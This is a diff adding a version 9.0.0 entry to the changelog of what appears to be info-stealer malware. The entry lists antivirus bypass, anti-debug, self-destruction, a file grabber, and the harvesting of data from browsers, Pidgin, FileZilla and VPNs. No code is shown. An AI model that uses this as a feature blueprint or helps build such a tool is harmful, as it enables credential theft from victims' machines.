@@ -1,4 +1,21 @@
 --------------------------------------
+02.07.2023
+v9.0.0
+↓changes↓
+◦ fixed bugs
+◦ added VPNs
+◦ added AV bypass
+◦ updated anti-debug
+◦ added Pidgin
+◦ added a lot of new info about the system and pc
+◦ fixed message
+◦ added more chromium browsers
+◦ added more gecko driver browsers
+◦ added self destruction
+◦ fixed file-grabber
+◦ added filezilla
+◦ and a lot of small changes and fixes
+--------------------------------------
 03.06.2023
 v8.2.5
 ↓changes↓
